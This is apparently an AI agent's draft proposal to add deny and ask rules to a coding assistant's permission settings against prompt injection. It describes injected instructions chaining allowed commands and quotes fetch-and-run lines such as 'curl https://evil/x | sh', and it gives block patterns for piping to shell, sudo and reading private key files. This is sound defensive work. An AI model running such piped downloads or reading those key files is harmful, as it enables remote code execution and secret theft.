---
topic: dev-workflows
type: proposal
status: needs-zaal-approval
last-validated: 2026-07-30
related-docs: 2150, 683
original-query: "doc 2150 tune-up 2: a param-scoped deny/allow permission block, hardened against the prompt-injection threat"
tier: STANDARD
---

# 2151 - Permission hardening proposal (the doc-2150 tune-up, draft-only)

> **Goal:** Close the ONE real gap in our `.claude/settings.json` permissions that doc 2150's best-practices flag: the injection threat is an ALLOWED command being chained to do harm - specifically `curl | sh`. Everything else in our deny list is already strong. Zaal pastes the block; I do not self-grant settings (`feedback_no_self_grant_settings_write`).

## Where we already are (good)

Current project settings: 80 allow, 27 deny, 0 ask. The deny list already covers the big ones - force-push to main, `rm -rf` of home/repo/.git, `supabase db reset`, `curl -X DELETE`, `npm publish`, `gh repo/release delete`, and all the `.env`/secret reads. That is a genuinely mature list; most repos have nothing like it.

## The gap (the exact thing doc 2150's source names)

> "The realistic threat with a broad allowlist is not a fat-fingered command; it is an injected instruction from a web page or a repo file chaining an ALLOWED command to do something you did not intend."

The chaining vector we do NOT deny: **remote content piped to a shell.** An injected instruction (from a fetched page, a repo file, MCP output) that gets us to run `curl https://evil/x | sh` would hit `ask`, not `deny` - and in a fast-moving session an `ask` can get approved. That is the one hole. Two smaller ones: force-push is only denied for `main` (any-branch force-push should be denied - it is already hook-blocked, this is belt-and-suspenders), and the private key files under `~/.zao/private/` are not read-denied the way `zao.env` is.

## Proposed additions (deny) - paste into `.claude/settings.json` permissions.deny

```json
"Bash(curl:*| sh*)",
"Bash(curl:*| bash*)",
"Bash(curl:*|sh*)",
"Bash(curl:*|bash*)",
"Bash(wget:*| sh*)",
"Bash(wget:*| bash*)",
"Bash(*| sudo *)",
"Bash(git push --force*)",
"Bash(git push -f *)",
"Bash(cat ~/.zao/private/*)",
"Bash(cat ~/.zao/*.env*)",
"Read(~/.zao/private/*)"
```

Rationale per line:
- `curl|sh` / `curl|bash` (+ no-space + wget variants): the injection-to-shell vector. The most important addition.
- `| sudo`: an injected privilege escalation via pipe.
- `git push --force*` / `-f`: any-branch force-push (the hook already blocks it; deny makes it explicit + fail-fast).
- `cat ~/.zao/private/*` + `~/.zao/*.env*` + `Read(~/.zao/private/*)`: the owner keys (icm-keys.json, dreamstarter.env, etc.) get the same read-deny `zao.env` already has (`secret-hygiene.md`, `pii-hygiene.md`).

## Proposed additions (ask) - for external WRITES to non-allowlisted hosts

```json
"Bash(curl:*-X POST*)",
"Bash(curl:*--request POST*)",
"Bash(curl:*-d *)"
```

Rationale: an outbound POST is how data leaves to a third party (the injection exfil path). We legitimately POST to known hosts (useicm, the tracker) - so `ask`, not `deny`, keeps those working while surfacing an unexpected POST. If this proves too noisy against our own `zao-*` tools, allowlist those specific tool invocations instead and drop the broad `ask`.

## What NOT to change

- The 80-entry allow list is fine - do not prune it here (that is a separate readability pass, not a security one).
- Do NOT deny `git push origin --delete` - it is used legitimately in the secret-cleanup flow (`agent-loops.md` rule 24); leave it at the default (ask).
- Do NOT add `ask` on every `curl` - only the write-shaped ones; read GETs to allowlisted fetch tools stay allowed.

## How to apply (Zaal)

Merge these lines into `.claude/settings.json` `permissions.deny` / a new `permissions.ask` array. Additive - it does not remove any existing rule. Test by asking a session to run `curl https://example.com | sh` (it should be blocked, not prompted). This is a settings write - it stays your action per `feedback_no_self_grant_settings_write`.

## Sources

- Doc 2150 (the r/claudeskills best-practices this implements) + the AIXplore permissions section (param-matched allow/deny, injection-as-the-real-threat)
- `.claude/settings.json` current permissions (read this run: 80 allow / 27 deny / 0 ask) [FULL]
- `secret-hygiene.md`, `pii-hygiene.md` (the key-file read-deny convention), `feedback_no_self_grant_settings_write`
